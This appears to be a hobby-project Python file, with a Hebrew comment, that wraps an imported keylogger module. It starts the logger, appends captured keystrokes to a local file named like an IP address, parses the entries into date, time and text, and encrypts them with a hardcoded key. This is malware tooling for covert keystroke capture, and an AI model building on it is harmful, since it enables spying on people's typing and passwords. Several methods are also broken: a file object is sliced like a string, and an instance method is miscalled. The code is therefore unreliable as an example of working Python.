import keylloger
import Encryptor_

FILEֹ_NAME = "12.34.56.78"




class Meneger:
    def File_name(self, str_):        
        with open(FILEֹ_NAME, "a") as f:
            f.write(str_)
        self.f = f
        return self.f
            
    def create_dict(self, file):
        # אנחנו רוצים להפוך את כל מה שבקובץ טקסט שנשלח אלינו למילון ולחלק את המפתחות לשעה ולטקסט עצמו
        file = self.f
        self.my_dict = {"time":file[11:19], "date":file[:10], "text":file[19:]}
        return self.my_dict
    
    def do_encryption(self, d: {dict}):
        self.d = self.my_dict
        self.text = d["text"]
        self.key = "986"
        self.new_text = Encryptor_.Encryptor(self.key)
        return self.new_text.encrypt(self.text)
    
    def do_decrypt(self, enc: str):
        self.enc = Meneger.do_encryption(self.my_dict)
        self.real_text = Encryptor_.Encryptor(self.key)
        return self.real_text.decrypt(self.enc)
    
    def meneger(self):
        self.keylloger = keylloger.Keylogger(interval = 60, report_method="file")
        return self.keylloger.start()
    

if __name__ == "__main__":
    meneger_ = Meneger()
    meneger_.meneger()
